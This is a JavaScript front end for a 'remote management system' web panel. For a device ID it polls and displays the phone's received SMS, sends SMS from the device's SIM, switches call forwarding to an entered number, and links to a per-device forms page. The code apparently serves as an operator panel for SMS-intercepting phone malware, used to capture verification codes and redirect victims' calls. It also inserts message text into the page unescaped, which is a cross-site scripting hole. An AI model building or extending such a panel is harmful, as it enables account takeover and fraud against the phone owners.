const urlParams = new URLSearchParams(window.location.search);
const deviceId = urlParams.get('id');

// Use relative path by default to leverage Vercel's rewrite rules
let apiBaseUrl = ''; 

// If testing locally (localhost), use a CORS proxy so data loads without blocking
if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
    apiBaseUrl = 'https://corsproxy.io/?https://v0-remotemanagementsystem-six.vercel.app';
}

document.getElementById('current-device-id').textContent = deviceId || 'Unknown Device';

const smsListEl = document.getElementById('sms-list');

async function fetchSMS() {
    if(!deviceId) return;
    try {
        const res = await fetch(`${apiBaseUrl}/api/device/${deviceId}/sms`);
        if(res.ok) {
            const data = await res.json();
            renderSMS(data);
        }
    } catch(e) {
        console.error("Failed to fetch SMS", e);
    }
}

function renderSMS(smsList) {
    const existingCards = smsListEl.querySelectorAll('.sms-card');
    
    // Sort SMS by received_at descending
    smsList.sort((a, b) => new Date(b.received_at) - new Date(a.received_at));
    
    // Check if we need full render or just skip updates if it's the exact same length and first ID matches
    // For SMS, we can do full rerender if length differs
    if (existingCards.length !== smsList.length || (existingCards.length > 0 && smsList.length > 0 && existingCards[0].dataset.id !== String(smsList[0].id))) {
        smsListEl.innerHTML = '';
        smsList.forEach(sms => {
            smsListEl.appendChild(createSMSCard(sms));
        });
        return;
    }
}

function createSMSCard(sms) {
    const card = document.createElement('div');
    card.className = 'sms-card';
    card.dataset.id = sms.id;
    
    // The date format from API is ISO. the user screenshot shows exactly "2026-03-12T08:27:23.083Z"
    card.innerHTML = `
        <div class="sms-sender">
            <i class="fa-solid fa-envelope"></i> From: ${sms.sender}
        </div>
        <div class="sms-body">${sms.message_body}</div>
        <div class="sms-time">
            <i class="fa-solid fa-clock"></i> ${sms.received_at}
        </div>
    `;
    return card;
}

function openModal(id) {
    document.getElementById(id).classList.add('show');
}
function closeModal(id) {
    document.getElementById(id).classList.remove('show');
}

// Click outside to close modal
window.addEventListener('click', (e) => {
    if (e.target.classList.contains('modal')) {
        e.target.classList.remove('show');
    }
});

// Interaction Logic
document.getElementById('btn-get-forms').addEventListener('click', () => {
    window.location.href = `forms.html?id=${deviceId}`;
});

document.getElementById('send-sms-btn').addEventListener('click', async () => {
    const phone = document.getElementById('sms-phone').value;
    const msg = document.getElementById('sms-body').value;
    const sim = document.querySelector('input[name="sms-sim"]:checked').value;
    
    if (!phone || !msg) return alert("Please fill all fields.");

    const originalText = document.getElementById('send-sms-btn').textContent;
    document.getElementById('send-sms-btn').textContent = 'SENDING...';

    try {
        await fetch(`${apiBaseUrl}/api/device/${deviceId}/sms/send`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone_number: phone, message: msg, sim: sim })
        });
    } catch(e) {
        console.error("Failed to send sms", e);
    }
    
    document.getElementById('send-sms-btn').textContent = originalText;
    closeModal('sms-modal');
});

document.getElementById('activate-fw-btn').addEventListener('click', async () => {
    handleCallForwarding('activate');
});

document.getElementById('deactivate-fw-btn').addEventListener('click', async () => {
    handleCallForwarding('deactivate');
});

async function handleCallForwarding(action) {
    const fwNumber = document.getElementById('dev-fw-number').value;
    const sim = document.querySelector('input[name="fw-sim"]:checked').value;
    
    if (action === 'activate' && !fwNumber) return alert("Please enter forwarding number.");

    const btnId = action === 'activate' ? 'activate-fw-btn' : 'deactivate-fw-btn';
    const originalText = document.getElementById(btnId).textContent;
    document.getElementById(btnId).textContent = 'PROCESSING...';

    try {
        await fetch(`${apiBaseUrl}/api/device/${deviceId}/forwarding`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: action, forward_number: fwNumber, sim: sim })
        });
    } catch(e) {
        console.error("Failed to process call forwarding", e);
    }
    
    document.getElementById(btnId).textContent = originalText;
    closeModal('forwarding-device-modal');
}

// Start loop
fetchSMS();
setInterval(fetchSMS, 1500);
